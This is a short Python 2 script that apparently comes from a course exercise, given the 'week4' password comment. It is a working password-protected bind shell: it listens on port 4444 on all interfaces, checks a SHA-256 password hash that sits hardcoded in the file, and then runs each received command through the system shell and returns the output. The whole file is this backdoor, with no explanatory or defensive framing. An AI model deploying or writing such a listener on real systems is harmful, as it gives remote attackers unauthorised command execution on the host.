import socket
import subprocess
import hashlib

HOST = ''
PORT = 4444

# SHA256 hash of "week4"
HASHED_PASSWORD = "e155e1647a15f63bfae6fc357b7ed2e5d83f21a71ef01a446e7ae3c3fcfcf058"

def start_server():
    print("[SERVER] Initializing...")
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(1)
    print("[SERVER] Waiting for connection...")

    while True:
        try:
            client, address = server.accept()
            print("[SERVER] Connected to %s" % str(address))

            password = client.recv(1024).strip()
            print("[LOGIN ATTEMPT] Password received: '%s'" % password)

            # Compute SHA256 hash
            hashed = hashlib.sha256(password).hexdigest()
            print("[DEBUG] Computed hash: %s" % hashed)

            if hashed == HASHED_PASSWORD:
                client.send("success")
                print("[SERVER] Login successful.")
                handle_client(client)
            else:
                client.send("fail")
                print("[SERVER] Login failed. Hash mismatch.")
                client.close()
        except Exception as e:
            print("[SERVER ERROR] %s" % str(e))
            continue

def handle_client(client):
    while True:
        try:
            print("[SERVER] Waiting for command...")
            command = client.recv(1024).strip()
            print("[SERVER] Command received: '%s'" % command)

            if not command or command.lower() == 'exit':
                break

            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            response = out + err
            if not response:
                response = "no stdout"

            client.send(response)
            print("[SERVER] Response sent.")
        except Exception as e:
            print("[COMMAND ERROR] %s" % str(e))
            break

    client.close()
    print("[SERVER] Client disconnected.")

if __name__ == "__main__":
    start_server()
